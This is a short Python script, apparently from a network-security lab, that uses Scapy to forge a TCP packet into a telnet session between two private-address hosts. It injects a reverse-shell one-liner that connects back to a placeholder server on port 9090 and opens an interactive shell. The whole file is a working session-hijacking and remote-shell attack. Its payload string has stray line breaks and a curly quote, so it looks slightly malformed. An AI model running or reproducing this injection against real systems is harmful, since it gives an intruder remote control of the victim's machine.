#!/usr/bin/python3
from scapy.all import *
ip = IP(src="192.168.199.159", dst="192.168.199.156")
tcp = TCP(sport=37362, dport=23, flags="A", seq=1400950515, ack=3800340316)
data = "python -c 'import
socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<SERVER-IP>\",9090));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);’\n"
pkt = ip/tcp /data
ls(pkt)
send(pkt,verbose=0)
